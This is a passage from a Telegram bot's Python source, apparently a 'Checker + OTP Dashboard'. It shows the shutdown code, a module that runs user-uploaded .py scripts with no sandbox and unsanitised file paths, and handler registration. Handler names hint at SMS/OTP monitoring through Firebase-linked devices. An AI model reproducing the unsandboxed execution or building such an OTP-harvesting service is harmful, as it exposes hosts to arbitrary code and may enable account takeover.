                                reply_markup=_force_join_kb())
                            logger.info("access restricted uid=%s (channel leave)", uid)
                        except Exception as exc:
                            logger.info("could not notify restricted %s: %s", uid, exc)
        except asyncio.CancelledError:
            raise
        except Exception as e:
            logger.error(f"maintenance: {e}")


# ============================================================
# SHUTDOWN
# ============================================================
async def _post_stop(app):
    for task in list(sms_monitor_tasks.values()):
        if not task.done():
            task.cancel()
    if sms_monitor_tasks:
        await asyncio.gather(*sms_monitor_tasks.values(), return_exceptions=True)
    sms_monitor_tasks.clear()
    sms_monitor_state.clear()
    for task in list(admin_panel_live_tasks.values()):
        if not task.done():
            task.cancel()
    if admin_panel_live_tasks:
        await asyncio.gather(*admin_panel_live_tasks.values(), return_exceptions=True)
    admin_panel_live_tasks.clear()
    logger.info("Monitor loops cancelled.")


async def _telegram_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    error = context.error
    logger.error(
        "telegram handler error update=%s: %s",
        type(update).__name__, error,
        exc_info=(type(error), error, error.__traceback__) if error else None)


# ============================================================
# BOT HOSTING — admin-approved users only
# ============================================================
_hosting_lock = asyncio.Lock()
HOSTING_APPROVED: Set[int] = set()
HOSTED_BOTS: List[dict] = []  # list of bot records


def _load_hosting_approved() -> Set[int]:
    try:
        with open(HOSTING_APPROVED_FILE, "r", encoding="utf-8") as fh:
            data = json.load(fh)
        if isinstance(data, list):
            return {int(x) for x in data}
        if isinstance(data, dict):
            return {int(x) for x in (data.get("approved") or [])}
    except (FileNotFoundError, json.JSONDecodeError, OSError, TypeError, ValueError):
        pass
    return set()


def _save_hosting_approved():
    try:
        with open(HOSTING_APPROVED_FILE, "w", encoding="utf-8") as fh:
            json.dump(sorted(HOSTING_APPROVED), fh, indent=2)
    except OSError as exc:
        logger.warning("could not save hosting approved: %s", exc)


def _load_hosted_bots() -> List[dict]:
    try:
        with open(HOSTED_BOTS_FILE, "r", encoding="utf-8") as fh:
            data = json.load(fh)
        if isinstance(data, list):
            return data
    except (FileNotFoundError, json.JSONDecodeError, OSError, TypeError):
        pass
    return []


def _save_hosted_bots():
    try:
        with open(HOSTED_BOTS_FILE, "w", encoding="utf-8") as fh:
            json.dump(HOSTED_BOTS, fh, ensure_ascii=False, indent=2)
    except OSError as exc:
        logger.warning("could not save hosted bots: %s", exc)


HOSTING_APPROVED = _load_hosting_approved()
HOSTED_BOTS = _load_hosted_bots()


def is_hosting_approved(user_id: int) -> bool:
    if user_id in ADMIN_IDS:
        return True
    return int(user_id) in HOSTING_APPROVED


def approve_hosting(user_id: int) -> dict:
    uid = int(user_id)
    if uid in HOSTING_APPROVED:
        return {"success": False, "reason": "already"}
    HOSTING_APPROVED.add(uid)
    _save_hosting_approved()
    return {"success": True}


def revoke_hosting(user_id: int) -> dict:
    uid = int(user_id)
    if uid not in HOSTING_APPROVED:
        return {"success": False, "reason": "not_approved"}
    HOSTING_APPROVED.discard(uid)
    _save_hosting_approved()
    # stop their running bots
    for b in list(HOSTED_BOTS):
        if int(b.get("user_id") or 0) == uid:
            _kill_hosted_pid(b.get("pid"))
            b["status"] = "stopped"
            b["pid"] = None
    _save_hosted_bots()
    return {"success": True}


def _pid_alive(pid) -> bool:
    if not pid:
        return False
    try:
        pid = int(pid)
    except (TypeError, ValueError):
        return False
    if psutil:
        try:
            if not psutil.pid_exists(pid):
                return False
            p = psutil.Process(pid)
            return p.status() != getattr(psutil, "STATUS_ZOMBIE", "zombie")
        except Exception:
            return False
    try:
        os.kill(pid, 0)
        return True
    except OSError:
        return False


def _kill_hosted_pid(pid):
    if not pid:
        return
    try:
        pid = int(pid)
    except (TypeError, ValueError):
        return
    try:
        if psutil and psutil.pid_exists(pid):
            psutil.Process(pid).kill()
            return
    except Exception:
        pass
    try:
        os.kill(pid, signal.SIGKILL)
    except Exception:
        pass


def _next_host_id() -> int:
    if not HOSTED_BOTS:
        return 1
    return max(int(b.get("id") or 0) for b in HOSTED_BOTS) + 1


def _user_hosted_bots(user_id: int) -> List[dict]:
    return [b for b in HOSTED_BOTS if int(b.get("user_id") or 0) == int(user_id)]


def hosting_menu_kb(user_id: int = 0):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📤 UPLOAD .py BOT", callback_data="host_upload_info")],
        [InlineKeyboardButton("📱 MY HOSTED BOTS", callback_data="host_my_bots")],
        [InlineKeyboardButton("📊 HOST STATUS", callback_data="host_status")],
        [InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_home")],
    ])


def host_bot_control_kb(bot_id: int):
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("▶️ START", callback_data=f"host_start:{bot_id}"),
            InlineKeyboardButton("🛑 STOP", callback_data=f"host_stop:{bot_id}"),
        ],
        [
            InlineKeyboardButton("📜 LOGS", callback_data=f"host_logs:{bot_id}"),
            InlineKeyboardButton("🧹 CLEAR LOGS", callback_data=f"host_clearlog:{bot_id}"),
        ],
        [InlineKeyboardButton("🗑️ DELETE", callback_data=f"host_del:{bot_id}")],
        [InlineKeyboardButton("🔄 REFRESH", callback_data=f"host_manage:{bot_id}")],
        [InlineKeyboardButton("🔙 MY HOSTED BOTS", callback_data="host_my_bots")],
    ])


def start_hosted_process(record: dict) -> Optional[int]:
    filepath = record.get("filepath") or ""
    logpath = record.get("logpath") or (filepath + ".log")
    if not filepath or not os.path.isfile(filepath):
        return None
    try:
        log_file = open(logpath, "a", encoding="utf-8")
        log_file.write(f"\n--- [START {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ---\n")
        log_file.flush()
        proc = subprocess.Popen(
            [sys.executable, "-u", os.path.basename(filepath)],
            stdout=log_file,
            stderr=subprocess.STDOUT,
            cwd=os.path.dirname(filepath) or ".",
            start_new_session=True,
        )
        try:
            log_file.close()
        except Exception:
            pass
        return proc.pid
    except Exception as exc:
        logger.error("start_hosted_process failed: %s", exc)
        return None


async def host_crash_guard_loop():
    """Restart approved users' bots that crashed (auto_guard=1)."""
    while True:
        try:
            await asyncio.sleep(15)
            changed = False
            for b in list(HOSTED_BOTS):
                if b.get("status") != "running":
                    continue
                pid = b.get("pid")
                if _pid_alive(pid):
                    # truncate huge logs
                    logpath = b.get("logpath") or ""
                    try:
                        if logpath and os.path.exists(logpath):
                            if os.path.getsize(logpath) > HOST_MAX_LOG_MB * 1024 * 1024:
                                with open(logpath, "w", encoding="utf-8") as f:
                                    f.write(f"--- [LOG RESET >{HOST_MAX_LOG_MB}MB {datetime.now()}] ---\n")
                    except Exception:
                        pass
                    continue
                uid = int(b.get("user_id") or 0)
                if not is_hosting_approved(uid):
                    b["status"] = "stopped"
                    b["pid"] = None
                    changed = True
                    continue
                if not b.get("auto_guard", 1):
                    b["status"] = "stopped"
                    b["pid"] = None
                    changed = True
                    continue
                new_pid = start_hosted_process(b)
                if new_pid:
                    b["pid"] = new_pid
                    b["status"] = "running"
                    logger.info("[HOST] auto-restart id=%s pid=%s", b.get("id"), new_pid)
                else:
                    b["status"] = "stopped"
                    b["pid"] = None
                changed = True
            if changed:
                _save_hosted_bots()
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            logger.error("host crash guard: %s", exc)


async def hosting_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    data = q.data or ""
    uid = q.from_user.id
    chat_id = q.message.chat_id if q.message else uid

    if is_banned(uid) and uid not in ADMIN_IDS:
        await q.edit_message_text("🚫 You are banned.", reply_markup=main_home_kb(uid))
        return

    # Admin hosting approval actions
    if data == "admin_host_approve":
        if uid not in ADMIN_IDS:
            return
        context.user_data["admin_action"] = "host_approve"
        await q.edit_message_text(
            "🤖 *Approve Hosting Access*\n\n"
            "User ID bhejo jisko hosting allow karni hai.\n"
            "Example: `123456789`",
            parse_mode="Markdown",
            reply_markup=admin_back_kb(),
        )
        return

    if data == "admin_host_revoke":
        if uid not in ADMIN_IDS:
            return
        context.user_data["admin_action"] = "host_revoke"
        approved = sorted(HOSTING_APPROVED)
        lines = ["🚫 *Revoke Hosting*\n\n"]
        if approved:
            lines.append("Approved users:")
            for a in approved[:40]:
                lines.append(f"• `{a}`")
            lines.append("\nUser ID bhejo to revoke.")
        else:
            lines.append("Koi approved user nahi.")
        await q.edit_message_text(
            "\n".join(lines),
            parse_mode="Markdown",
            reply_markup=admin_back_kb(),
        )
        return

    if data == "admin_host_list":
        if uid not in ADMIN_IDS:
            return
        approved = sorted(HOSTING_APPROVED)
        lines = [f"🤖 *Hosting Approved* ({len(approved)})\n"]
        if not approved:
            lines.append("\nEmpty list.")
        else:
            for a in approved[:50]:
                n = len(_user_hosted_bots(a))
                lines.append(f"• `{a}` — {n} script(s)")
        await q.edit_message_text(
            "\n".join(lines),
            parse_mode="Markdown",
            reply_markup=admin_panel_kb(uid),
        )
        return

    # User hosting entry
    if data == "mode_hosting":
        set_mode(uid, "hosting")
        if not is_hosting_approved(uid):
            await q.edit_message_text(
                "🤖 <b>BOT HOSTING</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "⛔ Access nahi hai.\n\n"
                "Sirf <b>admin-approved</b> users hosting use kar sakte hain.\n"
                "Admin se approve karwao.\n\n"
                "🛡️ <b>VIP ALL IN ONE</b>",
                parse_mode="HTML",
                reply_markup=main_home_kb(uid),
            )
            return
        await q.edit_message_text(
            "🤖 <b>BOT HOSTING</b> (Approved)\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📦 Limit: <code>{HOST_BOT_LIMIT}</code> scripts\n"
            f"🛡️ Crash Guard: ON\n\n"
            "1. Upload <code>.py</code> file\n"
            "2. My Hosted Bots → Start\n"
            "3. Logs se errors check karo\n\n"
            "🛡️ <b>VIP ALL IN ONE</b>",
            parse_mode="HTML",
            reply_markup=hosting_menu_kb(uid),
        )
        return

    if data == "host_upload_info":
        if not is_hosting_approved(uid):
            await q.edit_message_text("⛔ Hosting not approved.", reply_markup=main_home_kb(uid))
            return
        set_mode(uid, "hosting")
        await q.edit_message_text(
            "📤 <b>Upload Bot</b>\n\n"
            "Is chat mein apna <code>.py</code> file bhejo.\n"
            "Same filename pe upload = replace.",
            parse_mode="HTML",
            reply_markup=hosting_menu_kb(uid),
        )
        return

    if data == "host_status":
        if not is_hosting_approved(uid):
            await q.edit_message_text("⛔ Hosting not approved.", reply_markup=main_home_kb(uid))
            return
        mine = _user_hosted_bots(uid)
        running = sum(1 for b in mine if b.get("status") == "running" and _pid_alive(b.get("pid")))
        await q.edit_message_text(
            f"📊 <b>Your Host Status</b>\n\n"
            f"📦 Scripts: <code>{len(mine)}</code> / <code>{HOST_BOT_LIMIT}</code>\n"
            f"🟢 Running: <code>{running}</code>\n"
            f"✅ Approved: Yes",
            parse_mode="HTML",
            reply_markup=hosting_menu_kb(uid),
        )
        return

    if data == "host_my_bots":
        if not is_hosting_approved(uid):
            await q.edit_message_text("⛔ Hosting not approved.", reply_markup=main_home_kb(uid))
            return
        mine = _user_hosted_bots(uid)
        if not mine:
            await q.edit_message_text(
                "❌ No hosted bots yet.\nUpload a .py file first.",
                reply_markup=hosting_menu_kb(uid),
            )
            return
        rows = []
        for b in mine:
            alive = b.get("status") == "running" and _pid_alive(b.get("pid"))
            icon = "🟢" if alive else "🔴"
            rows.append([InlineKeyboardButton(
                f"{icon} {b.get('filename', '?')}",
                callback_data=f"host_manage:{b.get('id')}",
            )])
        rows.append([InlineKeyboardButton("🔙 HOSTING MENU", callback_data="mode_hosting")])
        await q.edit_message_text(
            "⚙️ Select a bot to manage:",
            reply_markup=InlineKeyboardMarkup(rows),
        )
        return

    if data.startswith("host_manage:"):
        bot_id = int(data.split(":", 1)[1])
        await _render_host_control(q, uid, bot_id)
        return

    if data.startswith("host_start:"):
        bot_id = int(data.split(":", 1)[1])
        if not is_hosting_approved(uid):
            return
        async with _hosting_lock:
            rec = next((b for b in HOSTED_BOTS if int(b.get("id") or 0) == bot_id), None)
            if not rec or int(rec.get("user_id") or 0) != uid and uid not in ADMIN_IDS:
                await q.answer("Not found.", show_alert=True)
                return
            if _pid_alive(rec.get("pid")):
                await q.answer("Already running.")
            else:
                pid = start_hosted_process(rec)
                if pid:
                    rec["pid"] = pid
                    rec["status"] = "running"
                    _save_hosted_bots()
                    await q.answer("Started!")
                else:
                    await q.answer("Start failed.", show_alert=True)
        await _render_host_control(q, uid, bot_id)
        return

    if data.startswith("host_stop:"):
        bot_id = int(data.split(":", 1)[1])
        async with _hosting_lock:
            rec = next((b for b in HOSTED_BOTS if int(b.get("id") or 0) == bot_id), None)
            if not rec or (int(rec.get("user_id") or 0) != uid and uid not in ADMIN_IDS):
                await q.answer("Not found.", show_alert=True)
                return
            _kill_hosted_pid(rec.get("pid"))
            rec["pid"] = None
            rec["status"] = "stopped"
            _save_hosted_bots()
            await q.answer("Stopped.")
        await _render_host_control(q, uid, bot_id)
        return

    if data.startswith("host_logs:"):
        bot_id = int(data.split(":", 1)[1])
        rec = next((b for b in HOSTED_BOTS if int(b.get("id") or 0) == bot_id), None)
        if not rec or (int(rec.get("user_id") or 0) != uid and uid not in ADMIN_IDS):
            await q.answer("Not found.", show_alert=True)
            return
        logpath = rec.get("logpath") or ""
        body = "No logs yet."
        if logpath and os.path.exists(logpath):
            try:
                with open(logpath, "r", encoding="utf-8", errors="ignore") as f:
                    lines = f.readlines()[-40:]
                body = "".join(lines) or body
            except Exception as exc:
                body = f"Error: {exc}"
        body = body[-3500:]
        await q.edit_message_text(
            f"📜 <b>Logs — {html_escape(str(rec.get('filename')))}</b>\n"
            f"<pre>{html_escape(body)}</pre>",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 REFRESH", callback_data=f"host_logs:{bot_id}")],
                [InlineKeyboardButton("🔙 BACK", callback_data=f"host_manage:{bot_id}")],
            ]),
        )
        return

    if data.startswith("host_clearlog:"):
        bot_id = int(data.split(":", 1)[1])
        rec = next((b for b in HOSTED_BOTS if int(b.get("id") or 0) == bot_id), None)
        if not rec or (int(rec.get("user_id") or 0) != uid and uid not in ADMIN_IDS):
            return
        logpath = rec.get("logpath") or ""
        if logpath and os.path.exists(logpath):
            open(logpath, "w").close()
        await q.answer("Logs cleared.")
        await _render_host_control(q, uid, bot_id)
        return

    if data.startswith("host_del:"):
        bot_id = int(data.split(":", 1)[1])
        async with _hosting_lock:
            rec = next((b for b in HOSTED_BOTS if int(b.get("id") or 0) == bot_id), None)
            if not rec or (int(rec.get("user_id") or 0) != uid and uid not in ADMIN_IDS):
                await q.answer("Not found.", show_alert=True)
                return
            _kill_hosted_pid(rec.get("pid"))
            for p in (rec.get("filepath"), rec.get("logpath")):
                if p and os.path.exists(p):
                    try:
                        os.remove(p)
                    except Exception:
                        pass
            HOSTED_BOTS[:] = [b for b in HOSTED_BOTS if int(b.get("id") or 0) != bot_id]
            _save_hosted_bots()
        await q.edit_message_text(
            "🗑️ Bot deleted.",
            reply_markup=hosting_menu_kb(uid),
        )
        return


async def _render_host_control(q, uid: int, bot_id: int):
    rec = next((b for b in HOSTED_BOTS if int(b.get("id") or 0) == bot_id), None)
    if not rec or (int(rec.get("user_id") or 0) != uid and uid not in ADMIN_IDS):
        await q.edit_message_text("❌ Bot not found.", reply_markup=hosting_menu_kb(uid))
        return
    alive = rec.get("status") == "running" and _pid_alive(rec.get("pid"))
    status = "🟢 Running" if alive else "🔴 Stopped"
    text = (
        f"🤖 <b>Bot Control</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📄 File: <code>{html_escape(str(rec.get('filename')))}</code>\n"
        f"📊 Status: {status}\n"
        f"🆔 PID: <code>{rec.get('pid') if alive else 'N/A'}</code>\n"
        f"🛡️ Auto-guard: {'ON' if rec.get('auto_guard', 1) else 'OFF'}"
    )
    await q.edit_message_text(
        text,
        parse_mode="HTML",
        reply_markup=host_bot_control_kb(bot_id),
    )


async def hosting_document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE, msg, user_id: int):
    """Handle .py upload when mode is hosting. Returns True if handled."""
    doc = msg.document
    file_name = doc.file_name or ""
    if get_mode(user_id) != "hosting" and not file_name.endswith(".py"):
        return False
    if get_mode(user_id) != "hosting":
        # only intercept .py when user is in hosting mode
        return False
    if not is_hosting_approved(user_id):
        await msg.reply_text(
            "⛔ Hosting access nahi hai. Admin se approve karwao.",
            reply_markup=main_home_kb(user_id),
        )
        return True
    if not file_name.endswith(".py"):
        await msg.reply_text("❌ Sirf <code>.py</code> file upload karo.", parse_mode="HTML")
        return True

    mine = _user_hosted_bots(user_id)
    existing = next((b for b in mine if b.get("filename") == file_name), None)
    if not existing and len(mine) >= HOST_BOT_LIMIT and user_id not in ADMIN_IDS:
        await msg.reply_text(
            f"⚠️ Limit reached ({HOST_BOT_LIMIT}). Purana bot delete karo.",
            reply_markup=hosting_menu_kb(user_id),
        )
        return True

    try:
        tg_file = await context.bot.get_file(doc.file_id)
        user_dir = os.path.join(HOST_DIR, str(user_id))
        os.makedirs(user_dir, exist_ok=True)
        filepath = os.path.join(user_dir, file_name)
        logpath = filepath + ".log"
        await tg_file.download_to_drive(custom_path=filepath)
    except Exception as exc:
        logger.error("hosting download failed: %s", exc)
        await msg.reply_text(f"❌ Download failed: {exc}")
        return True

    async with _hosting_lock:
        if existing:
            _kill_hosted_pid(existing.get("pid"))
            existing["filepath"] = filepath
            existing["logpath"] = logpath
            existing["status"] = "stopped"
            existing["pid"] = None
        else:
            HOSTED_BOTS.append({
                "id": _next_host_id(),
                "user_id": user_id,
                "filename": file_name,
                "filepath": filepath,
                "logpath": logpath,
                "pid": None,
                "status": "stopped",
                "auto_guard": 1,
            })
        _save_hosted_bots()

    await msg.reply_text(
        f"✅ <b>{html_escape(file_name)}</b> saved!\n\n"
        "📱 <b>My Hosted Bots</b> se Start karo.",
        parse_mode="HTML",
        reply_markup=hosting_menu_kb(user_id),
    )
    return True



# ============================================================
# MAIN
# ============================================================
def main():
    global bot_instance
    print("=" * 60)
    print("  VIP ALL IN ONE BOT — Checker + OTP Dashboard")
    print(f"  Token: ...{BOT_TOKEN[-8:]}")
    print(f"  Max Firebases: {MAX_FIREBASES}")
    print(f"  Global FBs: {len(global_fb_list)}")
    print(f"  Force-join: {len(REQUIRED_CHANNELS)}")
    print(f"  Captcha: {'ON' if captcha_enabled else 'OFF'}")
    print(f"  Referral: 1 refer = {REFERRAL_HOURS} hours")
    print(f"  SMS Monitor idle timeout: {SMS_MONITOR_IDLE_TIMEOUT // 60} minutes")
    print(f"  Owner: {OWNER_ID}")
    print(f"  Admins: {sorted(ADMIN_IDS)}")
    print(f"  Banned: {len(BANNED_USERS)}")
    print("=" * 60)

    app = Application.builder().token(BOT_TOKEN).build()
    bot_instance = app.bot

    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("admin", admin_cmd))
    app.add_handler(CommandHandler("redeem", redeem_cmd))
    app.add_handler(CommandHandler("genkey", genkey_cmd))
    app.add_handler(CallbackQueryHandler(
        admin_callback,
        pattern=r"^admin_(back|stats|channels|add_channel|add_firebase|manage_fb|broadcast|toggle_maintenance|toggle_captcha|feature_maint|toggle_feat:\w+|remove_channel:\d+|fb_refresh:\d+|fb_delete:\d+|fb_info:\d+|gift_access|gift_single|gift_all|genkey|listkeys|add_admin|remove_admin|list_admins|ban_user|unban_user|banned_list)$"))
    app.add_handler(CallbackQueryHandler(generate_number_callback,
                                          pattern="^generate_number$"))
    app.add_handler(CallbackQueryHandler(
        mode_and_checker_callback,
        pattern=r"^(main_home|mode_checker|mode_otp|mode_files|redeem_help|chk_menu_|chk_admin_)"))
    app.add_handler(CallbackQueryHandler(
        hosting_callback,
        pattern=r"^(mode_hosting|host_|admin_host_)"))
    app.add_handler(CallbackQueryHandler(
        menu_callback,
        pattern=r"^(device_list|menu_back|dev:.+|sms_refresh:.+|sms:.+|smsmon:.+|smsmon_stop:.+|force_verify|scan_active|scan_fb:\d+|delete_fb:\d+|fbnoop:\d+|noop|devpage:\d+|manage_firebase)$"))
    app.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE,
        text_router))
    app.add_handler(MessageHandler(
        filters.Document.ALL & filters.ChatType.PRIVATE,
        checker_document_handler))
    app.add_error_handler(_telegram_error_handler)

    async def _post_init(application):
        global bot_instance, BOT_USERNAME
        bot_instance = application.bot
        try:
            me = await application.bot.get_me()
            BOT_USERNAME = me.username or "YourBot"
            logger.info("Bot username cached: @%s", BOT_USERNAME)
        except Exception as exc:
            logger.warning("could not cache bot username: %s", exc)
            BOT_USERNAME = "YourBot"
        application.bot_data["maintenance_task"] = asyncio.create_task(
            _maintenance_loop(application.bot))
        application.bot_data["device_refresh_task"] = asyncio.create_task(
            _global_device_refresh_loop())
        application.bot_data["host_guard_task"] = asyncio.create_task(
            host_crash_guard_loop())

    async def _post_stop_with_cleanup(application):
        task = application.bot_data.pop("maintenance_task", None)
        if task and not task.done():
            task.cancel()
            await asyncio.gather(task, return_exceptions=True)
        task = application.bot_data.pop("device_refresh_task", None)
        if task and not task.done():
            task.cancel()
            await asyncio.gather(task, return_exceptions=True)
        task = application.bot_data.pop("host_guard_task", None)
        if task and not task.done():
            task.cancel()
            await asyncio.gather(task, return_exceptions=True)
        await _post_stop(application)

    app.post_init = _post_init
    app.post_shutdown = _post_stop_with_cleanup
    print("Bot running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()